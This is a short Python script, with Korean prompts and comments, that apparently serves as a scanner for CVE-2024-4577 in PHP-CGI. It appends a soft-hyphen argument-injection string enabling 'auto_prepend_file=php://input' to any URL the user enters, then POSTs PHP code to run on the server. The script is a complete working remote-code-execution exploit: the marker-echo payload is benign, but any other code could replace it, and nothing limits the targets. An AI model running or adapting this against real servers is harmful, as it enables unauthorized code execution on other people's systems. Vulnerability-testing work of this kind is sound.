# SPDX-FileCopyrightText: © 2025 KimJuhyeong95 <bisyop@naver.com>
# SPDX-License-Identifier: MIT

import requests

def test_fixed_target():
    raw_url = input("스캔할 대상 URL을 입력하세요 (예: http://1.2.3.4 또는 http://1.2.3.4/index.php): ").strip()

    # 경로가 없는 경우 자동으로 루트 경로("/") 추가
    if "://" not in raw_url:
        raw_url = "http://" + raw_url  # 프로토콜 누락 시 기본값 http:// 추가

    if '?' in raw_url:
        # 이미 쿼리가 있는 경우는 그대로 사용
        full_url = raw_url + "&%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
    else:
        # 쿼리가 없다면 ?를 붙여 추가
        full_url = raw_url + "?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"

    print(f"[+] 테스트 대상 URL: {full_url}")

    payload = "<?php echo 'CVE-2024-4577-TEST'; ?>"

    try:
        response = requests.post(
            full_url,
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "CVE-2024-4577-Tester"
            },
            data=payload,
            timeout=5
        )

        if "CVE-2024-4577-TEST" in response.text:
            print("[✅] 취약: 서버가 PHP 코드를 실행했습니다.")
        else:
            print("[✔️] 비취약 또는 차단됨")
            print(f"[i] HTTP 상태 코드: {response.status_code}")
            print("[i] 응답 일부:")
            print(response.text.strip()[:300])

    except requests.exceptions.RequestException as e:
        print(f"[❌] 요청 실패: {e}")

if __name__ == "__main__":
    test_fixed_target()